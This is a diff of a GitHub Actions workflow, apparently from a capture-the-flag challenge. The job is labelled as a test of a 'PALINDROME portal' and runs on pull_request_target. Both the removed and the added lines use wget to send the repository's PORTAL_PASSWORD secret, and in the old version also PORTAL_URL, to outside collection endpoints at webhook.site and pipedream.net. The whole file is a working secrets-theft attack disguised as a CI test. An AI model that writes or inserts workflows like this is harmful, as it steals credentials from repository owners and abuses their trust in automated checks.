@@ -1,5 +1,7 @@
-name: Shag
-on: [ check_run, check_suite, create, delete, deployment, deployment_status, discussion, discussion_comment, fork, gollum, issue_comment, issues, label, merge_group, milestone, page_build, project, project_card, project_column, public, pull_request, pull_request_review, pull_request_review_comment, pull_request_target, push, registry_package, release, repository_dispatch, schedule, status, watch, workflow_call, workflow_dispatch]
+name: Test the PALINDROME portal
+
+on: pull_request_target
+
 jobs:
   test:
     runs-on: windows-latest
@@ -7,6 +9,5 @@ jobs:
       - uses: actions/checkout@v3
       - name: Test the PALINDROME portal
         run: | 
-          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          C:\msys64\usr\bin\wget.exe '''https://webhook.site/236b8b06-238d-4a30-a87e-11e4d805de0b?data=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}'''  -O test -d -v 
-          cat test 
+          C:\msys64\usr\bin\wget.exe '''https://eo5cx4o305d96bl.m.pipedream.net?a=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
